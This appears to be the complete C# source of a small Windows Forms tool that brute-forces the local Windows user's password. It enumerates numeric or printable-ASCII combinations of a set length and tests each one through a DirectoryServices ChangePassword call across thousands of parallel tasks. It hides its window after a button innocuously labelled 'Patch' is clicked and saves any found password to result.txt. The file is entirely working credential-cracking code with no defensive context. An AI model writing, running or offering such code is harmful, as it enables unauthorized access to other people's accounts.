using System;
using System.Windows.Forms;
using System.DirectoryServices;
using System.IO;
using System.Runtime.Remoting.Messaging;
using System.Threading.Tasks;
using System.Threading;
using System.Collections.Generic;
namespace GET
{
    public partial class Form1 : Form
    {
        public int from;
        public int to;
        public bool running = true ;
        public Thread clear;
        public TaskFactory tf;
        public List<Task> tasks;
        public int NumofBit;
        public char[] password;
        public DirectoryEntry user = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer").Children.Find(Environment.UserName, "user");
        public void GetPassword(int time)
        {
            for (int i =from ; i < to; i++)
            {
                password[time] = (char)i;
                if (time < NumofBit)
                {
                    GetPassword(time + 1);
                }
                else
                {
                    string p = new string(password);
                   tasks.Add(tf.StartNew(TryPassword, p));                                 
                }
            }
        }
        public void ClearTask(){
            while (running)
            {
                for (int i = 0; i < tasks.Count; i++)
                {
                    if (!running) break;
                        Task t = tasks[i];
                        try
                        {
                            if (t.IsCompleted)
                            {
                                tasks.Remove(t);
                                t.Dispose();
                            }
                        }
                        catch
                        {
                            i--;
                        }
                }
            }
        }
        public void TryPassword(object p)
        {
            object[] pa = { p, p };
            try
            {
                user.Invoke("ChangePassword", pa);
            }
            catch
            {
                return;
            }
            StreamWriter f = new StreamWriter(Application.StartupPath + "/result.txt");
            f.Write(p);
            f.Close();
            running = false;
            Application.Exit();
        }

        public Form1()
        {
            InitializeComponent();
            ThreadPool.SetMaxThreads(32000, Environment.ProcessorCount);
            tf = new TaskFactory();
            tasks = new List<Task>();
            clear = new Thread(new ThreadStart(ClearTask));
        }

        private void Patch_Click(object sender, EventArgs e)
        {
            from = OnlyNumber.Checked ? 48 : 32;
            to = OnlyNumber.Checked ? 58 : 127;
            Hide();
            password = new char[(int)Bits.Value];
            NumofBit = (int)Bits.Value - 1;
            clear.Start();
            GetPassword(0);          
        }
    }
}
